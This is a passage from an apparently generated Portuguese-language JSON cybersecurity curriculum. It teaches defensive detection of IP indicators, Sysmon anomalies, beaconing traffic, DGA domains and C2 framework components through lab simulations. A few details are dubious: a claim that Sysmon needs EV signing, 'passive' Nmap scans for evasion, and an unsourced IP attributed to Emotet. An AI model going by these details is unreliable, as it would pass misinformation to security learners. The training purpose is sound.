                                "Distingue falsos positivos de verdadeiros positivos em cenários mistos.",
                                "Explica impacto em campanhas C2/phishing."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de metadados WHOIS (80%+ acurácia).",
                                "Profundidade de padrões identificados (cobertura de 5+ heurísticas).",
                                "Qualidade da integração OSINT (múltiplas fontes correlacionadas).",
                                "Clareza e estrutura do relatório final.",
                                "Capacidade de evitar erros comuns em verificações simuladas.",
                                "Tempo de análise eficiente sem comprometer precisão."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de DNS e resolução de nomes (SC-02).",
                                "Programação: Scripts Python para automação WHOIS/entropy (PROG-04).",
                                "Inteligência de Ameaças: Correlação de IOCs (SC-07).",
                                "Ética em Cibersegurança: Privacidade em OSINT (ETH-03).",
                                "Análise Forense: Preservação de evidências digitais (FOR-01)."
                              ],
                              "realWorldApplication": "Em um SOC, analisa URLs em alertas de email gateway, bloqueando domínios C2 em ataques APT como Emotet, prevenindo infecções em massa e suportando incident response."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.3",
                            "name": "Utilizar Endereços IP como IOCs Estáticos",
                            "description": "Mapear endereços IP associados a servidores C2 ou infraestrutura maliciosa, diferenciando IPs públicos de privados e integrando com listas de bloqueio como AlienVault OTX.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Endereços IP Públicos e Privados",
                                  "subSteps": [
                                    "Estude as faixas de IPs privados conforme RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).",
                                    "Identifique IPs públicos como aqueles roteáveis na internet e associados a infraestruturas externas.",
                                    "Pratique identificando IPs em logs de rede usando ferramentas como ipcalc ou whois.",
                                    "Diferencie cenários onde IPs privados não podem ser IOCs estáticos para bloqueio global.",
                                    "Registre exemplos de IPs públicos maliciosos de relatórios de threat intelligence."
                                  ],
                                  "verification": "Classifique corretamente 10 IPs aleatórios como públicos ou privados com 100% de acerto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RFC 1918",
                                    "Ferramenta ipcalc",
                                    "Acesso a whois online"
                                  ],
                                  "tips": "Sempre verifique o contexto: IPs privados são internos e não roteáveis publicamente.",
                                  "learningObjective": "Diferenciar IPs públicos de privados para uso preciso como IOCs.",
                                  "commonMistakes": [
                                    "Confundir faixas privadas com públicas.",
                                    "Ignorar CGNAT em IPs públicos aparentes.",
                                    "Não considerar IPv6 ranges privadas (fc00::/7)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar Endereços IP como IOCs em Fontes Públicas",
                                  "subSteps": [
                                    "Acesse AlienVault OTX e busque por pulses relacionados a C2 servers.",
                                    "Colete IOCs de IPs de relatórios de malware como VirusTotal ou MalwareBazaar.",
                                    "Registre metadados: país, ASN, reputação e associações com campanhas APT.",
                                    "Use APIs de OTX para queries automatizadas (ex: otxcli).",
                                    "Compile uma lista inicial de 5-10 IPs suspeitos com evidências."
                                  ],
                                  "verification": "Gere um relatório com pelo menos 5 IOCs de IP validados de OTX com screenshots.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Conta gratuita AlienVault OTX",
                                    "VirusTotal",
                                    "otxcli tool"
                                  ],
                                  "tips": "Filtre por 'pulse' recentes e alta confiança para relevância.",
                                  "learningObjective": "Localizar e coletar IOCs de IP de fontes confiáveis como OTX.",
                                  "commonMistakes": [
                                    "Confiar em IOCs antigos sem verificar frescor.",
                                    "Ignorar falsos positivos de scans legítimos.",
                                    "Não anotar fontes para rastreabilidade."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear e Analisar IPs Associados a Infraestrutura Maliciosa",
                                  "subSteps": [
                                    "Realize whois, geolocalização e reverse DNS nos IPs coletados.",
                                    "Visualize conexões com ferramentas como Maltego ou Shodan para mapear C2.",
                                    "Correlacione com IOCs conhecidos de servidores C2 (ex: Cobalt Strike defaults).",
                                    "Avalie persistência: verifique se o IP ainda responde em portas comuns (80, 443).",
                                    "Crie um mapa de rede simples mostrando relações entre IPs maliciosos."
                                  ],
                                  "verification": "Produza um diagrama de mapeamento com análise de pelo menos 3 IPs.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Shodan.io",
                                    "Maltego CE",
                                    "Nmap para scans passivos"
                                  ],
                                  "tips": "Use scans passivos para evitar detecção; priorize ASN para blocos inteiros.",
                                  "learningObjective": "Analisar e mapear IPs para identificar padrões de C2.",
                                  "commonMistakes": [
                                    "Expor sua IP em scans ativos.",
                                    "Não validar geolocalização com múltiplas fontes.",
                                    "Sobrecarregar com dados irrelevantes."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar IPs em Listas de Bloqueio e Monitoramento",
                                  "subSteps": [
                                    "Adicione IPs a firewalls (ex: iptables, pfSense) ou proxies como listas de bloqueio.",
                                    "Integre com SIEM (ex: ELK Stack) para alertas em tráfego para esses IOCs.",
                                    "Teste a integração simulando tráfego para o IP bloqueado.",
                                    "Monitore logs para falsos positivos e ajuste regras.",
                                    "Documente a regra em um playbook de resposta a incidentes."
                                  ],
                                  "verification": "Demonstre bloqueio efetivo de um IP teste em ambiente lab com logs.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ambiente lab com pfSense ou Linux firewall",
                                    "Wireshark para teste"
                                  ],
                                  "tips": "Use CIDR para blocos eficientes; revise semanalmente IOCs.",
                                  "learningObjective": "Implementar IOCs de IP em defesas operacionais.",
                                  "commonMistakes": [
                                    "Bloquear IPs legítimos por falsos positivos.",
                                    "Não testar regras antes de produção.",
                                    "Esquecer de rotacionar IOCs dinâmicos."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de red team, identifique o IP público 104.248.81.188 (associado a C2 de Emotet via OTX), diferencie de 192.168.1.1 (privado), mapeie seu ASN (DigitalOcean) e integre em firewall para bloquear callbacks simulados de malware.",
                              "finalVerifications": [
                                "Diferencia corretamente 95% dos IPs públicos/privados em um quiz de 20 itens.",
                                "Coleta e valida 10 IOCs de IP de OTX com metadados completos.",
                                "Cria mapa preciso de 5 IPs maliciosos com ferramentas como Shodan.",
                                "Implementa e testa bloqueio de IOCs sem falsos positivos em lab.",
                                "Gera relatório final com evidências e recomendações.",
                                "Explica integração de IPs em SOC para pares."
                              ],
                              "assessmentCriteria": [
                                "Precisão na diferenciação de IPs (90%+ correto).",
                                "Qualidade e relevância dos IOCs coletados (fontes fidedignas).",
                                "Profundidade da análise e mapeamento (diagramaas claros).",
                                "Efetividade da integração em defesas (testes comprovados).",
                                "Documentação completa e acionável.",
                                "Tempo de execução dentro dos estimados (±20%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores (roteamento e CIDR).",
                                "Inteligência de Ameaças (Threat Hunting).",
                                "Análise Forense Digital (logs e IOCs).",
                                "Gerenciamento de Incidentes (playbooks).",
                                "Programação de Segurança (APIs OTX)."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, SOC analysts usam IPs como IOCs estáticos para bloquear comunicações com servidores C2 de ransomware em tempo real, prevenindo exfiltração de dados e integrando com EDR para detecção automatizada."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.2",
                        "name": "Indicadores de Compromisso Dinâmicos",
                        "description": "IOCs dinâmicos capturam comportamentos mutáveis e contextuais de ameaças, como anomalias em processos, tráfego de rede incomum ou padrões de persistência, exigindo análise comportamental em ambientes de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.2.1",
                            "name": "Detectar Comportamentos Anômalos em Sistemas",
                            "description": "Identificar ações suspeitas como execução de processos incomuns, modificações no registro ou criação de tarefas agendadas, usando ferramentas como Sysmon e análise de logs para simular detecção em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Ferramentas de Monitoramento",
                                  "subSteps": [
                                    "Instalar Sysmon em uma máquina virtual Windows com configurações padrão de eventos de segurança.",
                                    "Configurar regras personalizadas no Sysmon para capturar processos filhos, criações de arquivos e alterações de registro.",
                                    "Habilitar logging avançado no Windows Event Viewer para eventos de segurança (ID 4688 para processos).",
                                    "Testar a configuração gerando eventos benignos e verificando logs.",
                                    "Integrar com ferramentas como Event Log Explorer ou PowerShell para consulta rápida."
                                  ],
                                  "verification": "Logs do Sysmon mostram eventos capturados corretamente ao executar comandos de teste como 'whoami'.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Máquina virtual Windows 10/11",
                                    "Sysinternals Sysmon (baixar de Microsoft)",
                                    "Configuração XML do Sysmon",
                                    "PowerShell ISE"
                                  ],
                                  "tips": "Use VMs isoladas para evitar riscos reais; comece com configurações mínimas para não sobrecarregar o sistema.",
                                  "learningObjective": "Entender e implementar monitoramento baseline para detecção de anomalias.",
                                  "commonMistakes": [
                                    "Não assinar o Sysmon com certificado EV, causando falhas de instalação.",
                                    "Configurações muito amplas gerando logs excessivos.",
                                    "Esquecer de elevar privilégios para instalação."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coletar e Analisar Logs para Processos Incomuns",
                                  "subSteps": [
                                    "Executar consulta em logs do Sysmon (Event ID 1) filtrando por ImageLoaded e ProcessCreate com caminhos suspeitos (ex: temp folders).",
                                    "Identificar processos pais-filhos anômalos, como cmd.exe spawnando powershell.exe de locais incomuns.",
                                    "Usar PowerShell para grep-like: Get-WinEvent com XPath para hashes conhecidos ou nomes de processo raros.",
                                    "Correlacionar timestamps com atividades de rede (Sysmon Event ID 3).",
                                    "Classificar anomalias por frequência e contexto (ex: processo em %TEMP% com argumentos codificados)."
                                  ],
                                  "verification": "Relatório lista pelo menos 3 processos suspeitos simulados com evidências de logs.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Sysmon logs",
                                    "PowerShell",
                                    "Event Viewer ou ELK Stack básico",
                                    "Scripts de consulta pré-prontos"
                                  ],
                                  "tips": "Foquem em baselines: o que é normal no seu ambiente? Use ferramentas como Sysmon View para visualização.",
                                  "learningObjective": "Desenvolver habilidades para parsing e triagem de logs em busca de IOCs comportamentais.",
                                  "commonMistakes": [
                                    "Ignorar contexto: todo processo incomum nem sempre é malicioso.",
                                    "Sobrecarga de filtros muito largos.",
                                    "Não validar hashes com VirusTotal."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detectar Modificações no Registro e Tarefas Agendadas",
                                  "subSteps": [
                                    "Monitorar Sysmon Event ID 13 (Registry) para chaves como HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
                                    "Usar schtasks.exe /query /fo LIST para listar tarefas e filtrar por criadores recentes ou caminhos suspeitos.",
                                    "Analisar Event ID 4698 (Scheduled Task Created) no Security log para signers não confiáveis.",
                                    "Simular criação de tarefa maliciosa com at.exe e detectar via logs.",
                                    "Automatizar alertas com script PowerShell para mudanças em Run/RunOnce keys."
                                  ],
                                  "verification": "Identificar e deletar uma tarefa simulada maliciosa com evidência de log antes/depois.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Sysmon configurado",
                                    "Autoruns (Sysinternals)",
                                    "schtasks.exe",
                                    "Regedit para verificação manual"
                                  ],
                                  "tips": "Autoruns é ótimo para snapshot baseline; compare diffs antes/depois de simulações.",
                                  "learningObjective": "Reconhecer persistence mechanisms via registry e scheduler.",
                                  "commonMistakes": [
                                    "Confundir tarefas legítimas do sistema (ex: Windows Update).",
                                    "Não checar integridade de signers.",
                                    "Analisar só chaves óbvias, ignorando HKCU."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Detecção em Jogo de Guerra Cibernética",
                                  "subSteps": [
                                    "Configurar cenário em Atomic Red Team ou lab com Cobalt Strike beacon simulando C2.",
                                    "Executar ataques simulados: processo injetado, reg mod, task creation.",
                                    "Real-time hunting: query logs a cada 5min e pivotar para rede (Event ID 3).",
                                    "Gerar relatório com timeline de eventos anômalos correlacionados.",
                                    "Defesa: Bloquear via EDR simulado ou kill process."
                                  ],
                                  "verification": "Timeline completa detecta e mitiga 80% das simulações em <10min.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Atomic Red Team repo",
                                    "VMs atacante/vítima",
                                    "Sysmon + Sigma rules",
                                    "Mitre ATT&CK Navigator"
                                  ],
                                  "tips": "Use playbooks MITRE para mapear técnicas; grave sessões para review.",
                                  "learningObjective": "Aplicar detecção em cenários dinâmicos de red team/blue team.",
                                  "commonMistakes": [
                                    "Foco só em um IOC, ignorando kill chain.",
                                    "Não documentar falsos positivos.",
                                    "Ambiente não resetado entre runs."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Windows VM vítima e Kali atacante, simule um APT criando uma tarefa agendada em %APPDATA% para beacon C2. Use Sysmon para detectar ProcessCreate (ID1), RegistryValueSet (ID13) e TaskCreated (4698), correlacionando com NetworkConnect (ID3) para confirmar anomalia e bloquear via firewall rule.",
                              "finalVerifications": [
                                "Lista 5 comportamentos anômalos comuns com exemplos de logs Sysmon.",
                                "Configura e testa Sysmon em VM sem erros.",
                                "Detecta e relata modificações simuladas em <5min.",
                                "Gera timeline correlacionada de eventos em exercício prático.",
                                "Explica 3 persistence via registry/task com mitigações.",
                                "Automatiza query básica de logs via PowerShell."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de anomalias: 85%+ em simulações.",
                                "Qualidade da análise de logs: Correlação de pelo menos 3 eventos por IOC.",
                                "Tempo de detecção em cenários: <10min por exercício.",
                                "Relatório completo: Inclui evidências, timeline e recomendações.",
                                "Conhecimento de ferramentas: Uso correto de Sysmon, schtasks e PowerShell.",
                                "Mitigação efetiva: Bloqueio ou remoção de 80% das simulações."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Parsing e correlação de logs com SQL-like queries.",
                                "Programação: Scripts PowerShell para automação de hunting.",
                                "Redes: Correlação com tráfego C2 (Event ID 3 Sysmon).",
                                "Estatística: Baselines de normalidade e detecção de outliers.",
                                "Gestão de Projetos: Documentação de playbooks para SOC."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), analistas usam essas técnicas para detectar living-off-the-land attacks em endpoints corporativos, identificando early-stage APTs como SolarWinds ou persistências em tarefas agendadas, permitindo resposta rápida antes de lateral movement."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.2.2",
                            "name": "Analisar Tráfego de Rede como IOC Dinâmico",
                            "description": "Monitorar fluxos de rede para padrões anômalos, como conexões beaconing para C2, tráfego criptografado suspeito ou exfiltração de dados, utilizando Wireshark e Zeek em cenários de ataque.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Análise de Tráfego",
                                  "subSteps": [
                                    "Instalar Wireshark e Zeek em uma VM isolada (ex: Ubuntu 22.04).",
                                    "Configurar interface de rede para captura em modo promiscuous.",
                                    "Baixar e configurar datasets de tráfego malicioso (ex: CTU-13 ou Malware-Traffic-Analysis.net).",
                                    "Testar captura básica com ping para validar setup.",
                                    "Criar scripts iniciais de Zeek para logs personalizados."
                                  ],
                                  "verification": "Captura bem-sucedida de tráfego local sem erros e visualização inicial no Wireshark.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VM com Ubuntu",
                                    "Wireshark",
                                    "Zeek",
                                    "Datasets de tráfego malicioso"
                                  ],
                                  "tips": "Use bridges de rede virtuais para simular tráfego real sem risco à rede principal.",
                                  "learningObjective": "Configurar ferramentas essenciais para análise segura de tráfego de rede.",
                                  "commonMistakes": [
                                    "Executar em rede corporativa sem isolamento",
                                    "Ignorar dependências como libpcap",
                                    "Não ativar modo promiscuous"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Capturar e Filtrar Tráfego de Rede Inicial",
                                  "subSteps": [
                                    "Iniciar captura no Wireshark selecionando interface ativa.",
                                    "Simular ou carregar pcap com tráfego suspeito (ex: beaconing DNS).",
                                    "Aplicar filtros display como 'http contains \"user-agent\"' ou 'dns'.",
                                    "Exportar segmentos relevantes para análise profunda.",
                                    "Salvar captura como .pcapng para compatibilidade com Zeek."
                                  ],
                                  "verification": "Pcap gerado com pelo menos 1000 pacotes filtrados corretamente visualizáveis.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "Pcaps de amostra (ex: beaconing.pcap)"
                                  ],
                                  "tips": "Use tshark para capturas automatizadas em scripts para eficiência.",
                                  "learningObjective": "Dominar captura e filtragem básica para isolar tráfego relevante.",
                                  "commonMistakes": [
                                    "Filtros de captura muito amplos causando sobrecarga",
                                    "Não salvar em formato ring buffer",
                                    "Ignorar timestamps de pacotes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Padrões Anômalos com Wireshark",
                                  "subSteps": [
                                    "Inspecionar fluxos TCP/UDP para conexões beaconing (intervalos regulares).",
                                    "Verificar tráfego criptografado suspeito via estatísticas IO Graph.",
                                    "Identificar exfiltração por volumes altos de dados em portas não padrão.",
                                    "Usar Expert Information para alertas automáticos de anomalias.",
                                    "Criar estatísticas de conversas para mapear hosts C2 suspeitos."
                                  ],
                                  "verification": "Relatório gerado listando 3+ anomalias com screenshots de IO Graphs.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Wireshark",
                                    "Pcaps com IOCs (ex: C2_beacon.pcap)"
                                  ],
                                  "tips": "Aplique coloração personalizada para beaconing (ex: intervalos < 60s em vermelho).",
                                  "learningObjective": "Detectar IOCs visuais como beaconing e exfiltração via ferramentas GUI.",
                                  "commonMistakes": [
                                    "Confundir tráfego legítimo com beaconing sem baseline",
                                    "Não normalizar gráficos de tempo",
                                    "Ignorar follow stream para payloads"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar Análise Avançada com Zeek",
                                  "subSteps": [
                                    "Executar 'zeek -r capture.pcap local' para gerar logs (conn.log, dns.log).",
                                    "Analisar conn.log para origens/destinos com bytes anormais.",
                                    "Scriptar detecção de beaconing via zeekctl com métricas de variância.",
                                    "Correlacionar dns.log com http.log para túneis C2.",
                                    "Gerar alertas customizados para tráfego criptografado sem SNI válido."
                                  ],
                                  "verification": "Logs Zeek processados com pelo menos 5 IOCs identificados em relatório.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Zeek instalado",
                                    "Scripts Zeek de detecção",
                                    "Pcaps avançados"
                                  ],
                                  "tips": "Integre com ELK Stack para visualização de logs em tempo real.",
                                  "learningObjective": "Usar Zeek para análise scriptável e detecção de IOCs dinâmicos.",
                                  "commonMistakes": [
                                    "Não parsear protocolos corretamente",
                                    "Sobrecarregar com pcaps grandes sem -f filtro",
                                    "Ignorar service logs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar IOCs e Gerar Relatório Final",
                                  "subSteps": [
                                    "Correlacionar achados Wireshark/Zeek com threat intel (ex: VirusTotal IPs).",
                                    "Simular resposta: bloquear IPs C2 via firewall rules.",
                                    "Documentar IOCs em formato MITRE ATT&CK (TA0011).",
                                    "Testar detecção em novo pcap para falsos positivos.",
                                    "Automatizar pipeline com script bash unindo ferramentas."
                                  ],
                                  "verification": "Relatório completo com IOCs validados e script de automação funcional.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Threat intel tools",
                                    "Templates de relatório"
                                  ],
                                  "tips": "Use Zeek's notice framework para alertas acionáveis.",
                                  "learningObjective": "Integrar análises em inteligência acionável contra ameaças.",
                                  "commonMistakes": [
                                    "Não validar com baselines benignas",
                                    "Relatórios sem evidências",
                                    "Ignorar contexto de cenário de ataque"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de Red Team simulando APT29, capture tráfego de um host infectado beaconing a cada 50s para um C2 em 192.168.1.100:443. Use Wireshark para IO Graph mostrando picos regulares e Zeek conn.log para confirmar variância baixa em intervalos, identificando exfiltração de 500KB via HTTPS tunelado.",
                              "finalVerifications": [
                                "Detectar beaconing em pcap fornecido em <10min.",
                                "Gerar logs Zeek com IOCs corretos para tráfego criptografado.",
                                "Diferenciar exfiltração de tráfego legítimo via métricas.",
                                "Relatar 3 IOCs com evidências e MITRE mappings.",
                                "Automatizar análise básica via script.",
                                "Validar zero falsos positivos em baseline benigna."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de beaconing (intervalos <2min, >90% taxa).",
                                "Profundidade de análise Zeek (uso de 3+ logs correlacionados).",
                                "Eficiência temporal (análise completa em <5h).",
                                "Qualidade do relatório (evidências visuais + recomendações).",
                                "Criatividade em automação (script funcional).",
                                "Conhecimento de falsos positivos (explicação de baselines)."
                              ],
                              "crossCurricularConnections": [
                                "Redes (TCP/IP, protocolos de aplicação).",
                                "Programação (scripts Zeek em ZeekScript).",
                                "Estatística (análise de variância em intervalos).",
                                "Inteligência de Ameaças (MITRE ATT&CK framework).",
                                "Resposta a Incidentes (ferramentas SIEM)."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa financeira, analistas usam essa habilidade para detectar C2 em tráfego de funcionários, prevenindo exfiltração de dados sensíveis durante um ransomware attack, integrando com EDR para hunt proativo."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.2.3",
                            "name": "Reconhecer Padrões de Comunicação C2 Dinâmicos",
                            "description": "Observar sequências temporais de comunicação, como heartbeats irregulares ou DGA (Domain Generation Algorithms), e correlacionar com mindsets de adversários em operações ofensivas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Comunicação C2 Dinâmica",
                                  "subSteps": [
                                    "Estude definições de Command and Control (C2) em ciberataques.",
                                    "Identifique tipos de padrões dinâmicos: heartbeats irregulares e Domain Generation Algorithms (DGA).",
                                    "Revise exemplos de sequências temporais em comunicações maliciosas.",
                                    "Analise diferenças entre comunicações C2 estáticas e dinâmicas.",
                                    "Documente mindsets comuns de adversários em operações ofensivas."
                                  ],
                                  "verification": "Resuma em um diagrama os conceitos chave e diferenças identificadas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação MITRE ATT&CK sobre C2",
                                    "Vídeos tutoriais sobre DGA",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use diagramas de fluxo para visualizar sequências temporais.",
                                  "learningObjective": "Dominar terminologia e características básicas de C2 dinâmico.",
                                  "commonMistakes": [
                                    "Confundir C2 dinâmico com estático",
                                    "Ignorar contexto temporal nas sequências"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Heartbeats Irregulares em Logs de Rede",
                                  "subSteps": [
                                    "Colete logs de tráfego de rede simulados com heartbeats irregulares.",
                                    "Use ferramentas como Wireshark para inspecionar pacotes TCP/UDP.",
                                    "Calcule intervalos temporais entre heartbeats e identifique irregularidades (ex: desvios >20%).",
                                    "Compare com baselines normais de tráfego benigno.",
                                    "Registre padrões observados em uma planilha."
                                  ],
                                  "verification": "Gere um relatório destacando 3 exemplos de irregularidades detectadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Wireshark",
                                    "Logs de rede PCAP de simulações (ex: de Zeek ou Suricata)",
                                    "Planilha Excel/Google Sheets"
                                  ],
                                  "tips": "Filtre por portas comuns de C2 (ex: 443, 80) para reduzir ruído.",
                                  "learningObjective": "Detectar anomalias temporais em comunicações C2 via análise de heartbeats.",
                                  "commonMistakes": [
                                    "Focar apenas em volume de tráfego, ignorando timing",
                                    "Não normalizar dados temporais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Domain Generation Algorithms (DGA) em Domínios Gerados",
                                  "subSteps": [
                                    "Estude algoritmos DGA comuns (ex: baseados em datas ou PRNG).",
                                    "Gere domínios DGA usando scripts Python conhecidos.",
                                    "Monitore DNS queries em logs para padrões de alta entropia em domínios.",
                                    "Correlacione queries com IPs suspeitos e sequências temporais.",
                                    "Classifique domínios como benignos vs. maliciosos usando ferramentas."
                                  ],
                                  "verification": "Implemente um script simples que gera e identifica 5 domínios DGA.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Python com bibliotecas como dnspython",
                                    "Ferramentas como DGADigger ou Maltego",
                                    "Datasets de domínios DGA públicos"
                                  ],
                                  "tips": "Calcule entropia de strings de domínio (alta entropia >4 indica DGA).",
                                  "learningObjective": "Reconhecer e gerar padrões de DGA para detecção.",
                                  "commonMistakes": [
                                    "Subestimar variação diária em DGA",
                                    "Confundir com domínios legítimos de CDN"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar Padrões com Mindsets de Adversários",
                                  "subSteps": [
                                    "Mapeie padrões observados a táticas de adversários (ex: APT28 usa heartbeats irregulares).",
                                    "Analise cenários de operações ofensivas: stealth vs. velocidade.",
                                    "Crie perfis de mindsets baseados em frequência e timing de C2.",
                                    "Simule correlações em um ambiente de jogo de guerra cibernético.",
                                    "Avalie impactos em defesas (ex: evasão de detecção)."
                                  ],
                                  "verification": "Produza um relatório de inteligência ligando 3 padrões a mindsets específicos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios de threat intelligence (ex: FireEye, Mandiant)",
                                    "Ferramenta de simulação como Atomic Red Team"
                                  ],
                                  "tips": "Considere contexto operacional: heartbeats irregulares para persistência longa.",
                                  "learningObjective": "Integrar análise técnica com psicologia de adversários.",
                                  "commonMistakes": [
                                    "Isolar padrões sem contexto adversarial",
                                    "Generalizar mindsets sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício com tráfego PCAP de um ransomware usando DGA, identifique heartbeats irregulares a cada 5-15 minutos correlacionados a queries DNS de alta entropia, indicando um mindset de adversário focado em persistência stealth em rede corporativa.",
                              "finalVerifications": [
                                "Detecta corretamente heartbeats irregulares em 90% dos logs fornecidos.",
                                "Gera e classifica domínios DGA com precisão >85%.",
                                "Correlaciona padrões a pelo menos 2 mindsets de adversários conhecidos.",
                                "Produz relatórios com diagramas temporais claros.",
                                "Simula detecção em ambiente de jogo de guerra sem falsos positivos excessivos.",
                                "Explica impactos de padrões dinâmicos em defesas SOC."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de anomalias temporais (80%+).",
                                "Profundidade da análise de sub-padrões (DGA, heartbeats).",
                                "Qualidade da correlação com mindsets adversários.",
                                "Eficiência temporal na análise (dentro de limites estimados).",
                                "Criatividade em verificações e relatórios.",
                                "Ausência de erros comuns listados nos steps."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Análise de séries temporais e detecção de anomalias.",
                                "Programação: Scripts Python para parsing de logs e cálculo de entropia.",
                                "Inteligência: Perfilamento psicológico de threat actors.",
                                "Redes: Protocolos DNS e análise de pacotes.",
                                "Jogos de Guerra: Simulações táticas em ciberdefesa."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa financeira, detectar C2 dinâmico de um APT via heartbeats irregulares e DGA permite isolamento rápido de beacons maliciosos, prevenindo exfiltração de dados durante uma campanha de espionagem cibernética."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.3",
                    "name": "Conceitos de Comando e Controle Cibernético (C2)",
                    "description": "Mecanismos para comunicação remota entre operador e implantes em hosts comprometidos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.3.1",
                        "name": "Arquitetura Básica de Comando e Controle (C2)",
                        "description": "Estrutura fundamental que inclui servidores C2, implantes (agentes maliciosos) e canais de comunicação para permitir o controle remoto de hosts comprometidos por operadores de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.1.1",
                            "name": "Identificar componentes principais de um framework C2",
                            "description": "Reconhecer e descrever os elementos essenciais como servidor C2 (listener), agente/implant (stager ou payload) e handler, com exemplos de ferramentas como Cobalt Strike ou Empire, conforme descrito em guias de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Geral de Frameworks C2",
                                  "subSteps": [
                                    "Ler definições de Comando e Controle (C2) em contextos de Red Team.",
                                    "Identificar o propósito de um framework C2: comunicação persistente entre atacante e vítima.",
                                    "Revisar glossário: listener (servidor C2), implant (stager/payload), handler.",
                                    "Anotar diferenças entre stager (downloader) e payload (implant completo).",
                                    "Explorar arquitetura básica: fluxo de dados de C2."
                                  ],
                                  "verification": "Escrever um resumo de 100 palavras definindo C2 e seus componentes principais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Guia de Red Team Operations (ex: MITRE ATT&CK C2 Framework)",
                                    "Documentação oficial de Cobalt Strike (teamserver, listener)"
                                  ],
                                  "tips": "Use diagramas visuais para mapear o fluxo C2 desde o início.",
                                  "learningObjective": "Definir e diferenciar os conceitos fundamentais de um framework C2.",
                                  "commonMistakes": "Confundir C2 com simples backdoors; C2 é um framework completo com gerenciamento."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Servidor C2 (Listener)",
                                  "subSteps": [
                                    "Estudar o listener como ponto de escuta no servidor atacante.",
                                    "Examinar configurações: portas, protocolos (HTTP, DNS, etc.).",
                                    "Comparar listeners em ferramentas: Cobalt Strike beacon listener vs. Empire listener.",
